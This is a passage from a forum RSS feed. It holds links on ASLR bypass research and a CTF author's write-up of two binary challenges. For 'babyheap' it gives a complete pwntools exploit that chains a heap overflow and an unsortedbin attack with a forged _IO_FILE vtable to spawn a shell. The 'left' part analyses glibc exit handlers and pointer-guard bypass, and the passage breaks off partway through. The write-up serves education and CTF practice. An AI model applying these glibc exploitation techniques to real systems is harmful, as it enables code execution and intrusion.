<li><a href="https://www.blackhat.com/docs/asia-16/materials/asia-16-Marco-Gisbert-Exploiting-Linux-And-PaX-ASLRS-Weaknesses-On-32-And-64-Bit-Systems-wp.pdf">Exploiting Linux and PaX ASLR’s weaknesses on 32- and 64-bit systems</a></li>
<li><a href="https://pax.grsecurity.net/docs/aslr.txt">Address Space Layout Randomization by PAX</a></li>
<li><a href="http://cybersecurity.upv.es/attacks/offset2lib/offset2lib.html">Offset2lib: bypassing full ASLR on 64bit Linux</a></li>
<li><a href="http://security.di.unimi.it/~gianz/pubs/acsac09-lecture.pdf">Surgically returning to randomized lib(c)</a></li>
<li><a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/">Linux Kernel on Git</a></li>
<li><a href="https://dl.acm.org/citation.cfm?id=2857705.2857707">Derandomizing Kernel Address Space Layout for Memory Introspection and Forensics</a></li>
<li><a href="https://dl.acm.org/citation.cfm?id=2498111">Practical Timing Side Channel Attacks against Kernel Space ASLR</a></li>
<li><a href="http://www.ieee-security.org/TC/SP2013/papers/4977a574.pdf">Just-In-Time Code Reuse: On the Effectiveness of Fine-Grained Address Space Layout Randomization</a></li>
<li><a href="https://web.stanford.edu/~blp/papers/asrandom.pdf">On the Effectiveness of Address-Space Randomization</a></li>
</ul>
<p><strong>New ASLR bypass presented in March 2018</strong></p>
<ul>
<li><a href="https://www.blackhat.com/asia-18/briefings/schedule/index.html#return-to-csu-a-new-method-to-bypass-64-bit-linux-aslr-9485">RETURN-TO-CSU: A NEW METHOD TO BYPASS 64-BIT LINUX ASLR</a></li>
</ul>
<h3><a name="p-21375-misc-reads-26" class="anchor" href="https://d.clarkee.co.uk#p-21375-misc-reads-26"></a>Misc Reads</h3>
<ul>
<li><a href="https://www.kb.cert.org/vuls/id/817544">Windows 8 and later fail to properly randomize every application if system-wide mandatory ASLR is enabled via EMET or Windows Defender Exploit Guard</a></li>
<li><a href="http://hmarco.org/bugs/AMD-Bulldozer-linux-ASLR-weakness-reducing-mmaped-files-by-eight.html">AMD Bulldozer Linux ASLR weakness: Reducing entropy by 87.5%</a></li>
</ul>
            <p><small>12 posts - 6 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/exploit-mitigation-techniques-address-space-layout-randomization-aslr/5452">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/exploit-mitigation-techniques-address-space-layout-randomization-aslr/5452</link>
          <pubDate>Mon, 12 Feb 2018 10:58:36 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-5452</guid>
          <source url="https://d.clarkee.co.uk/t/exploit-mitigation-techniques-address-space-layout-randomization-aslr/5452.rss">Exploit Mitigation Techniques - Address Space Layout Randomization (ASLR)</source>
        </item>
        <item>
          <title>0x00ctf Writeup | babyheap &amp; left!</title>
          <dc:creator><![CDATA[exploit]]></dc:creator>
          <category>Exploit Development</category>
          <description><![CDATA[
            <p>In the name of Allah, the most beneficent, the most merciful.</p>
<hr>
<p>Hello everyone, i’ll be writing how it was expected for the tasks I made to be solved. <img src="/images/emoji/twitter/smile.png?v=9" title=":smile:" class="emoji" alt=":smile:"><br>
I finally found some free time, sorry for the late post.</p>
<p>So, this article will be splitted to two main parts:<br>
I. <em>babyheap</em><br>
II. <em>left</em></p>
<h3>I. <em>babyheap</em>
</h3>
<p>In this task, we have multiple functions, and we note the following:</p>
<ul>
<li><img src="//0x00sec.s3.amazonaws.com/original/2X/e/ee60e034ce8884fb3853d4e2d79edd0f1d6a95b9.png" width="161" height="103"></li>
</ul>
<p>Let’s analyse, each and every one of them slowly, so we know what we are dealing with…</p>
<p><em>} main():</em></p>
<ul>
<li><img src="//0x00sec.s3.amazonaws.com/original/2X/6/6f6bb6082de61f1ca87299c12a849623639697b0.png" width="389" height="407"></li>
</ul>
<p>On this first part, we see that the first thing the binary requests is a name, then we are going to enter an infinite loop that prints the menu, and calls a function: <em>sub_40086D</em>.<br>
Anyway, we are going to analyse it later since we are focusing on main() function currently, but it’s obvious that this function returns an integer, since right after the call is a <em>cmp eax, 6</em> operation, we are falling in a switch…<br>
<strong>menu</strong>: <em>“\x1B[31mMember manager!\x1B[0m\n1. add\n2. edit\n3. ban\n4. change name\n5. get gift\n6. exit”</em>.</p>
<ul>
<li>Let’s see the first 4 cases, each one of them calls a specific function, and goes to the start of the loop.</li>
</ul>
<ol>
<li><em>sub_4008c7</em></li>
<li><em>sub_400a1b</em></li>
<li><em>sub_400c77</em></li>
<li><em>sub_400d45</em></li>
</ol>
<ul>
<li>The rest of the cases, are doing their job directly.<br>
<em>case 5:</em><pre><code class="lang-auto"></code></pre>
</li>
</ul>
<p>loc_400E52:             ; jumptable 0000000000400E25 case 5<br>
mov     edi, offset aYourGift<br>
call    _puts<br>
mov     rax, cs:stdout<br>
mov     rdi, rax        ; stream<br>
call    _fflush<br>
mov     rax, [rbp+var_8]<br>
mov     rax, [rax]<br>
mov     rsi, rax<br>
mov     edi, offset format ; “%lu\n”<br>
mov     eax, 0<br>
call    _printf<br>
jmp     short loc_400EAA</p>
<pre><code class="lang-auto">
- So, it first call puts, with argument: *'your gift:'*.
*fflush(stdout)*, then *printf("%lu", [rax])*..
We can guess from *long unsigned* format, the *printed text*, and the dereferencing of the **RAX** register, that it will print a libc address. Indeed, it does (**read_got** contents).

- *case 6:*
This one won't take much to understand, it simply calls *exit(0)*..
- *default:*
```asm
mov     edi, offset aInvalidOption
call    _puts
mov     rax, cs:stdout
mov     rdi, rax        ; stream
call    _fflush
nop
</code></pre>
<ul>
<li>It calls puts with the argument <em>‘invalid option!’</em>, then calls <em>fflush(stdout)</em>.</li>
</ul>
<p><em>} sub_40086d:</em></p>
<ul>
<li><img src="//0x00sec.s3.amazonaws.com/original/2X/4/465f864aead489d50d1409c626c84fbb292f9633.png" width="397" height="437"></li>
</ul>
<p>This function, calls read first… then calls atoi on the input, returns the result.<br>
(<em>That moment when I discovered that It’s an old version of the pwnable vulnerable to OOB <img src="/images/emoji/twitter/cry.png?v=9" title=":cry:" class="emoji" alt=":cry:"></em>)</p>
<p><em>} sub_4008c7:</em></p>
<ul>
<li>This one is a big function, it’s add() function.<br>
it first prints a <em>“looking for place to register…”</em>, then goes in a loop from 0 to 3 to look for an empty slot.</li>
<li>if found:<br>
goes in an infinite loop requesting a valid size, it should be bigger than <em>0x7F</em> and less or equal to <em>0x1000</em>, so no fastbin allowed(<em>&gt; global_max_fast</em>). (<strong>data size</strong> will be added to <strong>metadata size</strong>(<em>0x10</em>), then created).<br>
When the size requirements are met, <em>malloc(size)</em> is then called,  requests a <em>‘username:’</em> and read in the chunk the <em>size</em> much. Then is a <em>secure check</em>, to null terminate the input, as long as it wouldn’t harm the <strong>next chunk</strong> size.<br>
Then the pointer to chunk is stored in the array, and returns.</li>
<li>if not:<br>
Well, just <em>returns</em> <img src="/images/emoji/twitter/laughing.png?v=9" title=":laughing:" class="emoji" alt=":laughing:">!</li>
</ul>
<p><em>} sub_400a1b:</em></p>
<ul>
<li>This is the edit function, it has 2 options, either a secure edit or a vulnerable one.<br>
You can only use them once each:</li>
<li>secure edit (<em>option 1</em>):<br>
First requests the index, then check if it’s valid and exists, then gets the chunk size using <strong>malloc_usable_size()</strong> function, reads that nbytes to the choosen chunk. and increments a variable that shows the secure edit has been used.</li>
<li>insecure edit (<em>option 2</em>):<br>
Similiar to secure edit, with a change on the level of the size, since it now uses <strong>strlen()</strong> function, which will end only when nullbyte is reached. which means, if we fill the chunk completely on add(), we can cause an <em>overflow</em> to the next chunk size.</li>
</ul>
<p><em>} sub_400c77:</em></p>
<ul>
<li>the ban function, or more precisely, the one that will call <strong>free()</strong>. It can only be used once, increments a specific variable if so, (<em>don’t you think it’ll allow UAF</em>).</li>
</ul>
<pre><code class="lang-auto">mov     ds:ptr[rax*8], 0
</code></pre>
<p><em>} sub_400d45:</em></p>
<ul>
<li>Allows you to change name, once again, only one time is allowed.</li>
</ul>
<p>Now that we have analysed all functions, we have noticed that the leak is easy to get, as it’s given, <em>gift option</em>… and there is a vulnerability allowing us to overwrite the <em>next chunk</em> metadata, it’s size precisely.</p>
<p>So, let’s think, what can we do?</p>
<ul>
<li>We can use secure and insecure edit only once, right? What if we use the insecure edit first to overflow to next chunk size and change it(make it either <strong>bigger</strong> or <strong>smaller</strong>), and then use the secure edit, that’s going to call <strong>malloc_usable_size</strong>, most people who have done that and failed, didn’t probably check the <em>source</em>, and those who did it without looking at it, probably, just added the size of the current to the size of the next one, without knowing why…</li>
</ul>
<pre><code class="lang-auto">static size_t
musable (void *mem)
{
 mchunkptr p;
 if (mem != 0)
   {
     p = mem2chunk (mem);
     if (__builtin_expect (using_malloc_checking == 1, 0))
       return malloc_check_get_size (p);
     if (chunk_is_mmapped (p))
       {
         if (DUMPED_MAIN_ARENA_CHUNK (p))
           return chunksize (p) - SIZE_SZ;
         else
           return chunksize (p) - 2 * SIZE_SZ;
       }
     else if (inuse (p)) // HERE
       return chunksize (p) - SIZE_SZ;
   }
 return 0;
}
</code></pre>
<ul>
<li>
<p>The only thing we need then to satisfy is that <strong>inuse§ == 1</strong>, to do that, we need to make a fake next size, with <em>PREV_INUSE</em> bit set.<br>
Now we know, we can make a used chunk overlap on a free’d one… Therefore, overwrite it’s metadata(<strong>FD</strong> &amp; <strong>BK</strong>), remember? We only can allocate small-largebins… Let’s create a small-largebin, free it, it’s going to be placed in unsortedbin list, what if we overwrite it’s BK? <strong>YES</strong>, <em>unsortedbin attack</em> for the win!</p>
</li>
<li>
<p>First, we start by implementing the functions to the exploit.</p>
</li>
</ul>
<pre><code class="lang-python">#!/usr/bin/python
from pwn import *
c = process('./babyheap')
def add(size, content):
   c.sendline('1')
   c.recvuntil('size:')
   c.sendline(str(size))
   c.recvuntil('username:')
   c.sendline(content)
   c.recvuntil('6. exit')
def edit(id, mode, content):
   c.sendline('2')
   c.recvuntil('2. insecure edit')
   c.sendline(str(mode))
   c.recvuntil('index:')
   c.sendline(str(id))
   c.recvuntil('new username:')
   c.sendline(content)
   c.recvuntil('6. exit')
def ban(id):
   c.sendline('3')
   c.recvuntil('index:')
   c.sendline(str(id))
   c.recvuntil('6. exit')
def change(name):
   c.sendline('4')
   c.recvuntil('enter new name:')
   c.sendline(name)
# PREPARE
name = "A" * 8
c.recvuntil('enter your name:')
c.sendline(name)
# EXPLOIT
#
# INTERACTIVE
c.interactive()
</code></pre>
<p>So the part we will start building is the <em>EXPLOIT</em> one!</p>
<ul>
<li>We’ll start by making the chunks:</li>
<li>1st chunk will be used to overflow from and use the insecure edit to influence the next chunk!</li>
<li>2nd chunk must be of size <strong>0x101</strong> as a minimum, so we control two bytes(unlike <strong>0x90</strong> or <strong>0xf0</strong> case).</li>
<li>Then, comes the victim chunk, this one will be free’d and pushed into unsortedbin list and we’ll try overwritting it’s metadata later on.</li>
<li>Finally, a bordering chunk that won’t allow <strong>top consolidation</strong> when the victim chunk is free’d!</li>
</ul>
<pre><code class="lang-auto">add(0x88, "A" * 0x88) # 0 ; chunk to overflow from
add(0x100, "B" * 8)   # 1 ; (size &gt;= 0x100) = 0x110
add(0x500, "C" * 8)   # 2 ; 0x510 chunk
add(0x88, "E" * 8)    # 3 ; prevent top consolidation
</code></pre>
<ul>
<li>But after allocating those, you’ll later find that after freeing <strong>chunk <span class="hashtag">#2</span></strong>, the secure edit is no longer working after changing the size of <strong>chunk <span class="hashtag">#1</span></strong> randomly <em>(because of the check mentionned above)</em>, so we will create a fake chunk within <strong>chunk <span class="hashtag">#2</span></strong> before freeing it, and do some <em>quick mafs</em> to calculate the fake size with precision!</li>
</ul>
<pre><code class="lang-auto">add(0x88, "A" * 0x88) # 0 ; chunk to overflow from
add(0x100, "B" * 8)   # 1 ; (size &gt;= 0x100) = 0x110
payload = "D" * 0x160  # filling
payload += p64(0)      # fake prev
payload += p64(0x21)   # fake size + PREV_INUSE &lt; important
add(0x500, payload)   # 2 ; 0x510 chunk
add(0x88, "E" * 8)    # 3 ; prevent top consolidation
</code></pre>
<p>After creating them chunks, now it’s our time to call…</p>
<ul>
<li>The great <em>free()</em>
</li>
</ul>
<pre><code class="lang-auto">c.recv()
ban(2) # put in unsortedbin
</code></pre>
<p>We will now overwrite the <strong>chunk <span class="hashtag">#1</span></strong> size, by overflowing from <strong>chunk <span class="hashtag">#0</span></strong>.<br>
Before doing so, what size should we assign?<br>
To calculate:<br>
(The original size of  <strong>chunk <span class="hashtag">#1</span></strong> + Header size <em>(prev_size &amp; size)</em> of <strong>chunk <span class="hashtag">#2</span></strong> + Filling size <em>(0x160)</em>) = (<em>0x110</em> + <em>0x8*2</em> + <em>0x160</em>) = <em>0x280</em><br>
<em>0x280</em> with addition of <strong>PREV_INUSE</strong> bit is 0x281, that’s our size!</p>
<ul>
<li>So let’s do that in the exploit!</li>
</ul>
<pre><code class="lang-auto">payload = "A" * 0x88  # filling
payload += p16(0x281) # next fake size
edit(0, 2, payload)   # using insecure edit for doing that
</code></pre>
<p>Now, we can take the prize, our precious leak, store and calculate the values!</p>
<ul>
<li>As follows:</li>
</ul>
<pre><code class="lang-auto">c.recv()
c.sendline('5')
c.recvline()
libc_read = int(c.recvline()[:-1], 10)
libc_base = libc_read - read_diff
libc_system = libc_base + sys_diff
#
print 'libc_base @ ' + hex(libc_base)
#
c.recv()
</code></pre>
<p>Now, when we are done with all of these stuff, we will be stuck thinking, overlapping chunks and unsortedbin attack, but what? really, what? What can be done with this only in hand?</p>
<ul>
<li>The answer is simple, many scenarios can be done, we cite the following:</li>
<li>By overwritting <strong>global_max_fast</strong> variable on libc <em>rw-p</em> area, we can make it treat any and every chunk when free’d as a fastbin chunk.</li>
<li>Another way is to mess with a <strong>_IO_FILE_plus</strong> struct or some pointer to it, such as the <strong>_IO_list_all</strong>, and that’s what we are going to do here.</li>
</ul>
<p>Something you should know is that, when we trigger the unsortedbin attack, the following will happen:<br>
<em>*(<strong>BK</strong>+0x10) = main_arena+XXX;</em><br>
If we set <strong>BK</strong> to the <strong>_IO_list_all</strong>-0x10, our chunk will be considered as a pure <strong>_IO_FILE</strong> struct, we’ll basically confuse it.<br>
But after doing that, the whole list is messed up now, while was previously a single linked list(<strong>_chain</strong>) to all the of the <em>stderr</em>, <em>stdin</em> and <em>stdout</em>. That will basically lead to a corruption, wouldn’t it?<br>
And that’s exactly where we are going to strike…</p>
<ul>
<li>The call to <strong>abort()</strong> function to terminate the program:</li>
</ul>
<pre><code class="lang-auto">/* Cause an abnormal program termination with core-dump.  */
void
abort (void)
{
/* ... */
   if (stage == 1)
   {
   	++stage;
   	fflush (NULL);
   }
</code></pre>
<ul>
<li>With <strong>fflush()</strong> macro:</li>
</ul>
<pre><code class="lang-auto">#define fflush(s) _IO_flush_all_lockp (0)
</code></pre>
<ul>
<li>
<strong>_IO_flush_all_lockp</strong> containing the following lines:</li>
</ul>
<pre><code class="lang-auto">   while (fp != NULL)
   {
   	run_fp = fp;
   	if (do_lock)
   		_IO_flockfile (fp);
   	if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)
   	|| (_IO_vtable_offset (fp) == 0
   	&amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr
   	&gt; fp-&gt;_wide_data-&gt;_IO_write_base))
   	)
   	&amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)
</code></pre>
<ul>
<li>As you can see, if the first parts of the check are passed <em>(we need to satisfy 'em later)</em>, a call to <strong>_IO_OVERFLOW()</strong> is done:</li>
</ul>
<pre><code class="lang-auto">#define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)
</code></pre>
<ul>
<li>Oh look, a usage of the vtable within!</li>
</ul>
<pre><code class="lang-auto">struct _IO_jump_t
{
   JUMP_FIELD(size_t, __dummy);             // 1
   JUMP_FIELD(size_t, __dummy2);            // 2
   JUMP_FIELD(_IO_finish_t, __finish);      // 3
   JUMP_FIELD(_IO_overflow_t, __overflow);  // 4 &lt;-- the choosen one!
</code></pre>
<ul>
<li>We are getting somewhere, cause <strong>_IO_list_all</strong> is a pointer to an _IO_FILE_plus struct, which supposedly contains a vtable.</li>
</ul>
<pre><code class="lang-auto">struct _IO_FILE_plus
{
   _IO_FILE file;
   const struct _IO_jump_t *vtable;
};
</code></pre>
<p>For further reading on this:<br>
<a href="http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html" rel="noopener nofollow ugc">House of Orange</a><br>
<a href="http://4ngelboy.blogspot.tw/2017/11/play-with-file-structure-yet-another.html" rel="noopener nofollow ugc">Playing with file structure</a><br>
<a href="https://code.woboq.org/userspace/glibc/libio/libioP.h.html#_IO_FILE_plus" rel="noopener nofollow ugc">Source</a></p>
<p>Anyway, we’ve seen that there’s a vtable after our fake <strong>_IO_FILE</strong> struct <em>(our in full-control chunk)</em>.</p>
<ul>
<li>We can change name which is in a known location <em>(PIE: OFF)</em>, that says:</li>
</ul>
<pre><code class="lang-python">payload = p64(0) * 3             # filling
payload += p64(libc_system)      # __overflow
change(payload)
</code></pre>
<p>Once this is done, we can start <em>crafting</em> the fake <strong>_IO_FILE</strong> to satisfy the first part of the check within <strong>_IO_flush_all_lockp()</strong> function, so it results into <strong>_IO_OVERFLOW()</strong> call!</p>
<ul>
<li>To satisfy is: <em>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</em>.</li>
</ul>
<pre><code class="lang-auto">struct _IO_FILE {
     int _flags;                /* High-order word is _IO_MAGIC; rest is flags. */
   #define _IO_file_flags _flags
     /* The following pointers correspond to the C++ streambuf protocol. */
     /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
#
     char* _IO_read_ptr;        /* Current read pointer */
     char* _IO_read_end;        /* End of get area. */
     char* _IO_read_base;        /* Start of putback+get area. */
     char* _IO_write_base;        /* Start of put area. */
     char* _IO_write_ptr;        /* Current put pointer. */
</code></pre>
<ul>
<li>So next part of the exploit calculates <strong>_IO_list_all</strong>, and <em>crafts</em> the <em>_IO_FILE</em> fake struct, bearing in mind that check to satisfy:</li>
</ul>
<pre><code class="lang-python">_IO_list_all = libc_base + iolist_diff
name_ptr = 0x6020a0
#
payload = "B" * 8*32                # overflow to victim chunk using secure edit
payload += '/bin/sh\x00'            # fake prev
payload += p64(0x61)                # fake shrinked size
payload += p64(0)                   # fake FD
payload += p64(_IO_list_all - 0x10) # fake BK
payload += p64(2)                   # fp-&gt;_IO_write_base
payload += p64(3)                   # fp-&gt;_IO_write_ptr
payload += p64(0) * 21              # filling
payload += p64(name_ptr)            # fake *vtable
# 
edit(1, 1, payload)                 # use secure edit 
</code></pre>
<p>You may have wondered, why did I put <em>‘/bin/sh\x00’</em> in <strong>prev_size</strong> field…<br>
Answer is simple: <strong>prev_size</strong> <em>(start of the chunk)</em> was passed in <strong>RDI</strong> register, so say, an argument to <strong>system()</strong> later.</p>
<p>Now, we already have almost done everything, all is left is to trigger the <em>unsortedbin attack</em>.</p>
<ul>
<li>And it’s done:</li>
</ul>
<pre><code class="lang-python">sleep(2)
#
pause()
c.recv()
c.sendline('1')
c.recvuntil('size:')
c.sendline(str(0x80))
</code></pre>
<ul>
<li>Finally, making sure to add the offsets, can be easily reteived with <a href="https://github.com/niklasb/libc-database" rel="noopener nofollow ugc">libc-database</a>…</li>
</ul>
<pre><code class="lang-python"># LOCAL
iolist_diff = 0x3c31a0
read_diff = 0xef320
sys_diff = 0x46590
</code></pre>
<p>By assembling all the above mentionned parts, we get it;</p>
<ul>
<li>Full exploit:</li>
</ul>
<pre><code class="lang-python">#!/usr/bin/python
from pwn import *
# LOCAL
iolist_diff = 0x3c31a0
read_diff = 0xef320
sys_diff = 0x46590
#
c = process('./babyheap')
#
def add(size, content):
   c.sendline('1')
   c.recvuntil('size:')
   c.sendline(str(size))
   c.recvuntil('username:')
   c.sendline(content)
   c.recvuntil('6. exit')
def edit(id, mode, content):
   c.sendline('2')
   c.recvuntil('2. insecure edit')
   c.sendline(str(mode))
   c.recvuntil('index:')
   c.sendline(str(id))
   c.recvuntil('new username:')
   c.sendline(content)
   c.recvuntil('6. exit')
def ban(id):
   c.sendline('3')
   c.recvuntil('index:')
   c.sendline(str(id))
   c.recvuntil('6. exit')
def change(name):
   c.sendline('4')
   c.recvuntil('enter new name:')
   c.sendline(name)
# PREPARE
name = "A" * 8
c.recvuntil('enter your name:')
c.sendline(name)
# EXPLOIT
add(0x88, "A" * 0x88) # 0 ; chunk to overflow from
add(0x100, "B" * 8)   # 1 ; (size &gt;= 0x100) = 0x110
payload = "D" * 0x160  # filling
payload += p64(0)      # fake prev
payload += p64(0x21)   # fake size + PREV_INUSE &lt; important
add(0x500, payload)   # 2 ; 0x510 chunk
add(0x88, "E" * 8)    # 3 ; prevent top consolidation
# 
c.recv()
ban(2) # put in unsortedbin
# 
payload = "A" * 0x88  # filling
payload += p16(0x281) # next fake size
edit(0, 2, payload)   # using insecure edit for doing that
# 
c.recv()
c.sendline('5')
c.recvline()
libc_read = int(c.recvline()[:-1], 10)
libc_base = libc_read - read_diff
libc_system = libc_base + sys_diff
#
print 'libc_base @ ' + hex(libc_base)
#
c.recv()
payload = p64(0) * 3             # filling
payload += p64(libc_system)      # __overflow
change(payload)
# 
_IO_list_all = libc_base + iolist_diff
name_ptr = 0x6020a0
#
payload = "B" * 8*32                # overflow to victim chunk
payload += '/bin/sh\x00'            # fake prev
payload += p64(0x61)                # fake shrinked size
payload += p64(0)                   # fake FD
payload += p64(_IO_list_all - 0x10) # fake BK
payload += p64(2)                   # fp-&gt;_IO_write_base
payload += p64(3)                   # fp-&gt;_IO_write_ptr
payload += p64(0) * 21              # filling
payload += p64(name_ptr)            # fake *vtable
# 
edit(1, 1, payload)                 # use secure edit
# 
sleep(2)
#
pause()
c.recv()
c.sendline('1')
c.recvuntil('size:')
c.sendline(str(0x80))
# INTERACTIVE
c.interactive()
</code></pre>
<p>That’s how we correctly do <strong>babyheap</strong>!</p>
<h3>II. <em>left</em>
</h3>
<p>While it seems like a small and easy task, it requires a bit more work.</p>
<ul>
<li>A small look at IDA:</li>
</ul>
<pre><code class="lang-auto">lea     rax, [rbp+art]
mov     rsi, rax
mov     edi, offset format ; "%s"
mov     eax, 0
call    _printf
mov     rax, [rbp+ptr]
mov     rax, [rax]
mov     rsi, rax
mov     edi, offset aPrintfLu ; "printf(): %lu\n"
mov     eax, 0
call    _printf
mov     edi, offset s   ; "read address:"
call    _puts
mov     rax, cs:__bss_start
mov     rdi, rax        ; stream
call    _fflush
lea     rax, [rbp+ptr]
mov     rsi, rax
mov     edi, offset aLu ; "%lu"
mov     eax, 0
call    ___isoc99_scanf
mov     rax, [rbp+ptr]
mov     rax, [rax]
mov     rsi, rax
mov     edi, offset aContentLu ; "content: %lu\n"
mov     eax, 0
call    _printf
mov     edi, offset aWriteAddress ; "write address:"
call    _puts
mov     rax, cs:__bss_start
mov     rdi, rax        ; stream
call    _fflush
lea     rax, [rbp+address]
mov     rsi, rax
mov     edi, offset aLu ; "%lu"
mov     eax, 0
call    ___isoc99_scanf
mov     edi, offset aNewValue ; "new value:\n"
call    _puts
mov     rax, cs:__bss_start
mov     rdi, rax        ; stream
call    _fflush
lea     rax, [rbp+value]
mov     rsi, rax
mov     edi, offset aLu ; "%lu"
mov     eax, 0
call    ___isoc99_scanf
mov     rax, [rbp+address]
mov     rdx, [rbp+value]
mov     [rax], rdx
mov     edi, 0          ; status
call    _exit
</code></pre>
<p>So, it first prints an ASCII art, then comes a <strong>libc_leak</strong> <em>(printf_got contents)</em>.<br>
after that, It’ll ask for an address to print it’s content.<br>
then, It will take an address then requests a value to assign to this last.<br>
but in the end, It’ll kill your hopes with an <em>exit(0);</em>!</p>
<p>It’s easy to deduce that the real work and analyse we should do is on exit internals…</p>
<ul>
<li>On <em>exit</em> call:</li>
</ul>
<pre><code class="lang-auto">void
exit (int status)
{
   __run_exit_handlers (status, &amp;__exit_funcs, true, true);
}
</code></pre>
<ul>
<li>
<em>__run_exit_handlers</em> ?</li>
</ul>
<pre><code class="lang-auto">void
   attribute_hidden
   __run_exit_handlers (int status, struct exit_function_list **listp,
                        bool run_list_atexit, bool run_dtors)
   {
     /* First, call the TLS destructors.  */
   #ifndef SHARED
     if (&amp;__call_tls_dtors != NULL)
   #endif
       if (run_dtors)
         __call_tls_dtors ();
#
     /* We do it this way to handle recursive calls to exit () made by
        the functions registered with `atexit' and `on_exit'. We call
        everyone on the list and use the status value in the last
        exit (). */
     while (true)
       {
         struct exit_function_list *cur;
#
         __libc_lock_lock (__exit_funcs_lock);
#
       restart:
         cur = *listp;
#
         if (cur == NULL)
           {
             /* Exit processing complete.  We will not allow any more
                atexit/on_exit registrations.  */
             __exit_funcs_done = true;
             __libc_lock_unlock (__exit_funcs_lock);
             break;
           }
#
         while (cur-&gt;idx &gt; 0)
           {
             struct exit_function *const f = &amp;cur-&gt;fns[--cur-&gt;idx];
             const uint64_t new_exitfn_called = __new_exitfn_called;
#
             /* Unlock the list while we call a foreign function.  */
             __libc_lock_unlock (__exit_funcs_lock);
             switch (f-&gt;flavor)
               {
                 void (*atfct) (void);
                 void (*onfct) (int status, void *arg);
                 void (*cxafct) (void *arg, int status);
#
               case ef_free:
               case ef_us:
                 break;
               case ef_on:
                 onfct = f-&gt;func.on.fn;
   #ifdef PTR_DEMANGLE
                 PTR_DEMANGLE (onfct);
   #endif
                 onfct (status, f-&gt;func.on.arg);
                 break;
               case ef_at:
                 atfct = f-&gt;func.at;
   #ifdef PTR_DEMANGLE
                 PTR_DEMANGLE (atfct);
   #endif
                 atfct ();
                 break;
               case ef_cxa:
                 /* To avoid dlclose/exit race calling cxafct twice (BZ 22180),
                    we must mark this function as ef_free.  */
                 f-&gt;flavor = ef_free;
                 cxafct = f-&gt;func.cxa.fn;
   #ifdef PTR_DEMANGLE
                 PTR_DEMANGLE (cxafct);
   #endif
                 cxafct (f-&gt;func.cxa.arg, status);
                 break;
               }
             /* Re-lock again before looking at global state.  */
             __libc_lock_lock (__exit_funcs_lock);
#
             if (__glibc_unlikely (new_exitfn_called != __new_exitfn_called))
               /* The last exit function, or another thread, has registered
                  more exit functions.  Start the loop over.  */
               goto restart;
           }
#
         *listp = cur-&gt;next;
         if (*listp != NULL)
           /* Don't free the last element in the chain, this is the statically
              allocate element.  */
           free (cur);
#
         __libc_lock_unlock (__exit_funcs_lock);
       }
#
     if (run_list_atexit)
       RUN_HOOK (__libc_atexit, ());
#
     _exit (status);
   }
</code></pre>
<ul>
<li>
<p>Notes:</p>
</li>
<li>
<p>First thing it does, is calling <strong>TLS</strong> destructors; That’s something we won’t <em>overthink or analyse</em> for now.</p>
</li>
<li>
<p>The interesting part lies in the <strong>while (cur-&gt;idx &gt; 0)</strong> loop. We have <em>cur</em> declared as a <strong>exit_function_list</strong>, this latter contains <strong>struct exit_function fns[32];</strong>!</p>
</li>
<li>
<p>We will be then checking the content of this <strong>exit_function</strong> struct.</p>
</li>
<li>
<p><em>exit_function</em> struct:</p>
</li>
</ul>
<pre><code class="lang-auto">   struct exit_function
     {
       /* `flavour' should be of type of the `enum' above but since we need
          this element in an atomic operation we have to use `long int'.  */
       long int flavor;
       union
         {
           void (*at) (void);
           struct
             {
               void (*fn) (int status, void *arg);
               void *arg;
             } on;
           struct
             {
               void (*fn) (void *arg, int status);
               void *arg;
               void *dso_handle;
             } cxa;
         } func;
     };
</code></pre>
<ul>
<li>
<p>Notes:</p>
</li>
<li>
<p>We can clearly see, that it has alot of interesting pointers on ‘<em>func</em>’ struct within.</p>
</li>
<li>
<p>Those will be our target to overwrite, but let’s not forget that they are ‘<strong>DEMANGLED</strong>’ before being called, so this says they are encrypted, to understand that, let’s check the <em>PTR_DEMANGLE</em> macro.</p>
</li>
<li>
<p><em>PTR_DEMANGLE</em> macro:</p>
</li>
</ul>
<pre><code class="lang-auto">   #  define PTR_DEMANGLE(var)        asm ("ror $2*" LP_SIZE "+1, %0\n"             \
                                        "xor %%fs:%c2, %0"                          \
                                        : "=r" (var)                                \
                                        : "0" (var),                                \
                                          "i" (offsetof (tcbhead_t,                 \
                                                         pointer_guard)))
</code></pre>
<ul>
<li>
<p>Notes:</p>
</li>
<li>
<p>It isn’t a big macro, there’s a ‘<em>ror</em>’ operation followed by a ‘<em>xor</em>’ one.</p>
</li>
<li>
<p>The first operation takes the <strong>(2*0x8)+1 = 0x11</strong> and rotates right the value of the <em>var</em> by that number.</p>
</li>
<li>
<p>The second is a bit problematic, since it goes to the <strong>TCB</strong>(<em>task control block</em>) and takes a secret value named ‘<em>pointer_guard</em>’.</p>
</li>
<li>
<p>But here’s the thing, ‘<em>xor</em>’ can be reversed easily, such as <em>‘2 ^ 0 = 2’</em> =&gt; <em>‘0 = 2 ^ 2’</em>. And that’s what we are going to use, to get the <em>pointer_guard</em> value, so we can mangle our <em>fake pointer</em> later, but to do that, we need the <em>mangled pointer</em>, and the <em>original function</em> that’s been mangled.</p>
</li>
<li>
<p>It’s time to run <strong>gdb</strong> and analyse what’s in there…<br>
Oh lord, it asks for a valid address to read/write, but we just want to analyse exit behaviour for now <img src="/images/emoji/twitter/crying_cat_face.png?v=9" title=":crying_cat_face:" class="emoji" alt=":crying_cat_face:">…<br>
WE’LL <strong>j* 0x4008a6</strong>  BOYS!<br>
But before doing that, let’s set a breakpoint on the <strong>__run_exit_handlers</strong>!</p>
</li>
<li>
